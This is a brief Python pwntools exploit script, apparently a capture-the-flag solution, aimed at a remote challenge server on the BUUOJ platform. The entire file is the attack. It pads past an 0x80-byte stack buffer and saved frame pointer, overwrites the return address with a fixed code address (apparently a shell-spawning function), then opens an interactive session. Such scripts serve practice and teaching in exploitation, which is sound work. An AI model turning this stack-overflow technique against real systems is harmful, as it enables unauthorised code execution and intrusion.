from pwn import *

#p = process('./291721f42a044f50a2aead748d539df0')
p = remote("node3.buuoj.cn",28315)

payload = 'a' * (0x80 + 0x8) 

payload += p64(0x0040059a)

p.recvuntil('Hello, World\n')

p.sendline(payload)

p.interactive()
